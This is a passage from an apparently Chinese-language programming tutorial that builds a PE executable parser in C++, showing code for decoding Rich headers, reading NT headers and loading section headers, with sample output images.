headers</code>？</p><ul><li>首先，<code>Rich headers</code>肯定是以四个字节的<code>Rich</code>（<code>0x68636952</code>），并且后面还跟着四个字节的<code>XOR key</code>；</li><li>然后，为了确定<code>Rich headers</code>的长度，我们向前搜索，并根据<code>XOR</code>密钥异或恢复原数据，并找到<code>DanS ID</code>（<code>0x536e6144</code>），这样一来我们就找到了<code>Rich headers</code>的起始位置；</li><li>最后，我们使用<code>XOR</code>密钥解密<code>Rich headers</code>的内容并恢复原数据。</li></ul></li><li><p>设计结构体用来存储<code>Rich headers</code>数据：</p></li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">__RICH_HEADER_DATA</span> {<br><span class="hljs-type">int</span>   data_size;<br><span class="hljs-type">char</span>* data_ptr;<br>}RICH_HEADER_DATA;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">__RICH_HEADER_ENTRY</span> {<br><span class="hljs-comment">// Build ID</span><br><span class="hljs-comment">// Product ID</span><br><span class="hljs-comment">// Count</span><br>WORD  r_build_id;<br>WORD  r_prod_id;<br>DWORD r_count;<br><br>}RICH_HEADER_ENTRY, *PRICH_HEADER_ENTRY;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">__RICH_HEADER</span> {<br>RICH_HEADER_DATA   raw_data;<br>PRICH_HEADER_ENTRY entries;  <span class="hljs-comment">// pointer</span><br><span class="hljs-type">int</span>                entries_num;<br><span class="hljs-type">bool</span>   exits; <span class="hljs-comment">// 这里我们使用了一个bool型变量表示是否存在该Header</span><br>}RICH_HEADER, * PRICH_HEADER;<br></code></pre></td></tr></tbody></table></figure><ul><li>处理逻辑代码：</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::parse_dos_stub</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-type">size_t</span> alloc_size;<br><span class="hljs-type">char</span>* dos_stub_buffer, * buf_ptr;<br><span class="hljs-type">int</span> i, start, end;<br>DWORD xor_key = <span class="hljs-number">0</span>;<br><br><span class="hljs-built_in">memset</span>(&amp;rich_headers, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(RICH_HEADER));<br><br><span class="hljs-comment">// 防止malloc_size_too_big问题</span><br>alloc_size = nt_headers_offset - <span class="hljs-built_in">sizeof</span>(__IMAGE_DOS_HEADER);<br><span class="hljs-keyword">if</span> (alloc_size + <span class="hljs-number">1</span> &gt; <span class="hljs-number">0xffffff</span>) {<br><span class="hljs-comment">// Really too big! Reject this allocation!</span><br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-comment">// 解析Rich headers</span><br>dos_stub_buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(alloc_size + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!dos_stub_buffer) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Dos_stub_buffer malloc failed\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">sizeof</span>(__IMAGE_DOS_HEADER) - <span class="hljs-number">1</span>, SEEK_SET);<br><span class="hljs-built_in">fread</span>(dos_stub_buffer, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>), alloc_size, pe_fp);<br>dos_stub_buffer[alloc_size] = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// 从后往前寻找 `Rich` 标志</span><br><span class="hljs-comment">// 理论上这里的Rich headers是对齐到4字节的</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">for (i = alloc_size - 4; i &gt;= 0; i -= 4) {</span><br><span class="hljs-comment">if (*(DWORD*)(dos_stub_buffer + i) == ___IMAGE_RICH_ID) {</span><br><span class="hljs-comment">// 找到 `Rich`</span><br><span class="hljs-comment">xor_key = *(DWORD*)(dos_stub_buffer + i + 4);</span><br><span class="hljs-comment">fprintf(stdout, "%x\n", xor_key);</span><br><span class="hljs-comment">}</span><br><span class="hljs-comment">}</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">for</span> (i = alloc_size - <span class="hljs-number">4</span>; i &gt;= <span class="hljs-number">0</span>; i--) {<br><span class="hljs-keyword">if</span> (dos_stub_buffer[i] == <span class="hljs-string">'R'</span> &amp;&amp;<br>dos_stub_buffer[i + <span class="hljs-number">1</span>] == <span class="hljs-string">'i'</span> &amp;&amp;<br>dos_stub_buffer[i + <span class="hljs-number">2</span>] == <span class="hljs-string">'c'</span> &amp;&amp;<br>dos_stub_buffer[i + <span class="hljs-number">3</span>] == <span class="hljs-string">'h'</span>) {<br><span class="hljs-comment">// 找到 `Rich`</span><br><span class="hljs-keyword">if</span> (i + <span class="hljs-number">8</span> &gt;= (<span class="hljs-type">int</span>)alloc_size) {<br><span class="hljs-comment">// 处理潜在的越界读问题</span><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Detect out bound read. Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>xor_key = *(DWORD*)(dos_stub_buffer + i + <span class="hljs-number">4</span>);<br><span class="hljs-keyword">break</span>;<br>}<br>}<br><span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span>) {<br><span class="hljs-comment">// 该PE文件可能经过修改调整，Rich headers可能被删除了</span><br><span class="hljs-comment">// 也有可能该PE文件格式有误</span><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"Warning: Cannot find Rich headers. (Ignore)\n"</span>);<br>rich_headers.exits = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">return</span>;<br>}<br><br>end = i + <span class="hljs-number">8</span>;<br><br><span class="hljs-comment">// 寻找起始点</span><br><span class="hljs-keyword">for</span> (i = end - <span class="hljs-number">8</span>; i &gt;= <span class="hljs-number">0</span>; i -= <span class="hljs-number">4</span>) {<br>DWORD* temp = (DWORD*)&amp;dos_stub_buffer[i];<br><span class="hljs-keyword">if</span> ((*temp ^ xor_key) == ___IMAGE_RICH_DANS_ID)<br><span class="hljs-keyword">break</span>;<br>}<br><span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>start = i;<br><br>alloc_size = end - start;<br>rich_headers.raw_data.data_ptr = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(alloc_size);<br><span class="hljs-keyword">if</span> (!rich_headers.raw_data.data_ptr) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Data_ptr malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>rich_headers.raw_data.data_size = alloc_size;<br><span class="hljs-built_in">memcpy</span>(rich_headers.raw_data.data_ptr, dos_stub_buffer + start, alloc_size);<br><span class="hljs-built_in">free</span>(dos_stub_buffer);<br><br><span class="hljs-comment">// 删除首部"DanS + 3padding"和尾部"Rich + XOR key"</span><br><span class="hljs-keyword">if</span>((alloc_size - <span class="hljs-number">24</span>) % <span class="hljs-number">8</span> == <span class="hljs-number">0</span> &amp;&amp; (alloc_size - <span class="hljs-number">24</span>) / <span class="hljs-number">8</span> &lt;= <span class="hljs-number">0xffff</span>)  <span class="hljs-comment">// 限制一下最大rich header数</span><br>rich_headers.entries_num = (alloc_size - <span class="hljs-number">24</span>) / <span class="hljs-number">8</span>;<br><span class="hljs-keyword">else</span> {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-comment">// 解析头部实体</span><br>rich_headers.entries = (PRICH_HEADER_ENTRY)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(RICH_HEADER_ENTRY) * rich_headers.entries_num);<br><span class="hljs-keyword">if</span> (!rich_headers.entries) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Rich_headers.entries malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>buf_ptr = rich_headers.raw_data.data_ptr + <span class="hljs-number">16</span>;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; rich_headers.entries_num; i++) {<br><br>DWORD* temp = (DWORD*)buf_ptr;<br>rich_headers.entries[i].r_prod_id = (*temp &gt;&gt; <span class="hljs-number">16</span>) ^ (xor_key &gt;&gt; <span class="hljs-number">16</span>);<br>rich_headers.entries[i].r_build_id = (*temp &amp; <span class="hljs-number">0x0000ffff</span>) ^ (xor_key &amp; <span class="hljs-number">0x0000ffff</span>);<br>temp++;<br>rich_headers.entries[i].r_count = *temp ^ xor_key;<br>buf_ptr += <span class="hljs-number">8</span>;<br><br>}<br><br>    rich_headers.exits = <span class="hljs-literal">true</span>;<br>    <br><span class="hljs-comment">// 酌情删除raw_data缓存的rich_headers原始数据</span><br><span class="hljs-built_in">free</span>(rich_headers.raw_data.data_ptr);<br><br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::print_dos_stub_info</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-comment">// 打印Rich headers的信息</span><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"=====Rich Headers=====\n\n"</span>);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"%-25s\tBuildID\t\tCount\t\tMeaning\n"</span>, <span class="hljs-string">"ProductName"</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; rich_headers.entries_num; i++) {<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"%-25s\t%d\t\t%d\t\t%d.%d.%d\n"</span>,<br>prod_ids_to_names[rich_headers.entries[i].r_prod_id],<br>rich_headers.entries[i].r_prod_id,<br>rich_headers.entries[i].r_count,<br>rich_headers.entries[i].r_build_id,<br>rich_headers.entries[i].r_prod_id,<br>rich_headers.entries[i].r_count<br>);<br>}<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END==========\n\n"</span>);<br><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>运行结果：</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/7.png"></p><hr><h3 id="Step-2-3-解析NT-Headers"><a href="#Step-2-3-解析NT-Headers" class="headerlink" title="Step 2.3: 解析NT Headers"></a>Step 2.3: 解析NT Headers</h3><ul><li><p><code>NT Headers</code>包含三个部分，分别是 <code>PE Signature</code> 、<code>File Header</code> 和 <code>Optional Header</code></p><ul><li><code>PE Signature</code>：没有啥玩意，就是四个字节0x4550（PE..），用来表示PE头</li><li><code>File Header</code>：记录文件的一些信息，如计算机体系结构类型、节区数量、时间戳、<code>Optional Header</code>大小、PE文件属性等等</li><li><code>Optional Header</code>：可选头，包含一些程序执行的重要信息，如程序执行入口地址、程序首选装载地址、内存中节区对齐大小、文件中节区对齐大小、镜像大小、PE头大小等等</li></ul></li><li><p>解析流程：</p><ul><li>按照相关结构体的信息依次解析即可</li></ul></li><li><p>处理逻辑代码：</p></li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::parse_nt_headers</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-type">size_t</span> read_size;<br><br><span class="hljs-built_in">fseek</span>(pe_fp, nt_headers_offset, SEEK_SET);<br>read_size = <span class="hljs-built_in">fread</span>(&amp;pe_nt_headers_32, <span class="hljs-built_in">sizeof</span>(___IMAGE_NT_HEADERS32), <span class="hljs-number">1</span>, pe_fp);<br><br><span class="hljs-keyword">if</span> (read_size != <span class="hljs-number">1</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>nt_sections_cnt = pe_nt_headers_32.FileHeader.NumberOfSections;<br>nt_optional_header_size = pe_nt_headers_32.FileHeader.SizeOfOptionalHeader;<br>nt_characteristics = pe_nt_headers_32.FileHeader.Characteristics;<br>nt_optional_headers = &amp;pe_nt_headers_32.OptionalHeader;<br>pe_header_size = nt_optional_headers-&gt;SizeOfHeaders;<br>import_dir_table_rva = nt_optional_headers-&gt;DataDirectory[___IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;<br>import_dir_table_size = nt_optional_headers-&gt;DataDirectory[___IMAGE_DIRECTORY_ENTRY_IMPORT].Size;<br>export_dir_table_rva = nt_optional_headers-&gt;DataDirectory[___IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;<br>export_dir_table_size = nt_optional_headers-&gt;DataDirectory[___IMAGE_DIRECTORY_ENTRY_EXPORT].Size;<br>basereloc_dir_table_rva = nt_optional_headers-&gt;DataDirectory[___IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;<br>basereloc_dir_table_size = nt_optional_headers-&gt;DataDirectory[___IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;<br>resource_dir_table_rva = nt_optional_headers-&gt;DataDirectory[___IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress;<br>resource_dir_table_size = nt_optional_headers-&gt;DataDirectory[___IMAGE_DIRECTORY_ENTRY_RESOURCE].Size;<br><br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::print_nt_headers_info</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>WORD temp_c, n, i;<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"======NT Headers======\n\n"</span>);<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"PE Signature: 0x%X\n\n"</span>, pe_nt_headers_32.Signature);<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"File Header:\n"</span>);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Machine: %s (0x%04X)\n"</span>, <br><span class="hljs-built_in">translate_machine</span>(pe_nt_headers_32.FileHeader.Machine),<br>pe_nt_headers_32.FileHeader.Machine);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Sections Count: %d\n"</span>, nt_sections_cnt);<br><span class="hljs-comment">// fprintf(stdout, " - Time Date Stamp: %d\n", pe_nt_headers_32.FileHeader.TimeDateStamp);</span><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Size of Optional Header: %d\n"</span>, nt_optional_header_size);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Characteristics: 0x%X\n"</span>, nt_characteristics);<br><span class="hljs-comment">// 进一步解析Characteritics</span><br>temp_c = nt_characteristics;<br>n = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (temp_c) {<br><span class="hljs-keyword">if</span> (temp_c &amp; <span class="hljs-number">1</span>) {<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - 0x%X:\t %s\n"</span>, (<span class="hljs-number">1</span> &lt;&lt; n), characteristics_names[n]);<br>}<br>temp_c = temp_c &gt;&gt; <span class="hljs-number">1</span>;<br>n++;<br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\nOptional Header:\n"</span>);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Magic: %s (0x%X)\n"</span>, <span class="hljs-built_in">translate_nt_optional_header_magic</span>(nt_optional_headers-&gt;Magic), nt_optional_headers-&gt;Magic);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Size of Code: 0x%X (%d)\n"</span>, nt_optional_headers-&gt;SizeOfCode, nt_optional_headers-&gt;SizeOfCode);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Size of Initialized Data: 0x%X (%d)\n"</span>, nt_optional_headers-&gt;SizeOfInitializedData, nt_optional_headers-&gt;SizeOfInitializedData);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Size of Uninitialized Data: 0x%X (%d)\n"</span>, nt_optional_headers-&gt;SizeOfUninitializedData, nt_optional_headers-&gt;SizeOfUninitializedData);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Entry Point: 0x%X (%d)\n"</span>, nt_optional_headers-&gt;AddressOfEntryPoint, nt_optional_headers-&gt;AddressOfEntryPoint);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Base of Code: 0x%X\n"</span>, nt_optional_headers-&gt;BaseOfCode);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Desired Image Base: 0x%X\n"</span>, nt_optional_headers-&gt;ImageBase);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Section Alignment: 0x%X\n"</span>, nt_optional_headers-&gt;SectionAlignment);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - File Alignment: 0x%X\n"</span>, nt_optional_headers-&gt;FileAlignment);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Size of Image: 0x%X (%d)\n"</span>, nt_optional_headers-&gt;SizeOfImage, nt_optional_headers-&gt;SizeOfImage);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Size of Headers: 0x%X (%d)\n"</span>, nt_optional_headers-&gt;SizeOfHeaders, nt_optional_headers-&gt;SizeOfHeaders);<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Data Directory:\n"</span>);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; ___IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR; i++) {<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - %s ==&gt; Address: 0x%X, Size: 0x%X\n"</span>, <span class="hljs-built_in">translate_data_directory</span>(i), nt_optional_headers-&gt;DataDirectory[i].VirtualAddress, nt_optional_headers-&gt;DataDirectory[i].Size);<br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END=========\n\n"</span>);<br><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>运行结果：</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/8.png"></p><hr><h3 id="Step-2-4-解析Section-Headers"><a href="#Step-2-4-解析Section-Headers" class="headerlink" title="Step 2.4: 解析Section Headers"></a>Step 2.4: 解析Section Headers</h3><ul><li><p><code>Section Headers</code>：存储着与节区相关的信息，包括节区名、<code>VirtualAddress</code>、<code>VirtualSize</code>、<code>PointerToRawData</code>、<code>SizeOfRawData</code>、<code>Characteristics</code>等</p><ul><li><code>VirtualAddress</code>：该节区载入内存中的偏移地址[11]；</li><li><code>VirtualSize</code>：该节区在内存中的大小（内存对齐之前的长度：真实长度）[11]；</li><li><code>PointerToRawData</code>：该节区在文件中的偏移地址[11]；</li><li><code>SizeOfRawData</code>：该节区在文件中的大小（文件对齐之前的长度：真实长度）[11]；</li><li><code>Characteristics</code>：用来表征该节区的一些属性，具体值详见<a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#section-flags">PE Format - Win32 apps | Microsoft Learn</a></li></ul></li><li><p>解析流程：</p><ul><li><code>Section Headers</code>在<code>NT Headers</code>之后，而<code>NT Headers</code>的值是固定的，可以通过<code>nt_headers_offset</code>偏移地址加上<code>NT Headers</code>的长度找到<code>Section Headers</code>在文件中的偏移地址；</li><li><code>Section Headers</code>中section数量由<code>NT Headers - FileHeader</code>中的<code>NumberOfSections</code>字段决定，因此可以通过该字段确定Section的数量；</li><li>按照<code>___IMAGE_SECTION_HEADER</code>结构体依次解析<code>NumberOfSections</code>个Section即可</li></ul></li><li><p>处理逻辑代码：</p></li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::parse_section_headers</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-type">size_t</span> read_size;<br><br><span class="hljs-comment">// 检查一下边界</span><br><span class="hljs-type">int</span> start_pos = nt_headers_offset + <span class="hljs-built_in">sizeof</span>(___IMAGE_NT_HEADERS32);<br><span class="hljs-keyword">if</span> (start_pos + nt_sections_cnt * <span class="hljs-built_in">sizeof</span>(___IMAGE_SECTION_HEADER) &gt; pe_header_size) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Out of PE header's size. Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-comment">// section_headers为指针变量，需要动态分配空间</span><br>section_headers = (___PIMAGE_SECTION_HEADER)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(___IMAGE_SECTION_HEADER) * nt_sections_cnt);<br><span class="hljs-keyword">if</span> (!section_headers) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Section_headers malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-built_in">fseek</span>(pe_fp, start_pos, SEEK_SET);<br>read_size = <span class="hljs-built_in">fread</span>(section_headers, <span class="hljs-built_in">sizeof</span>(___IMAGE_SECTION_HEADER), nt_sections_cnt, pe_fp);<br><br><span class="hljs-keyword">if</span> (read_size != nt_sections_cnt) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::print_section_headers_info</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><br><span class="hljs-type">int</span> i;<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"====Section Headers===\n"</span>);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"Number of Sections: %d\n\n"</span>, nt_sections_cnt);<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; 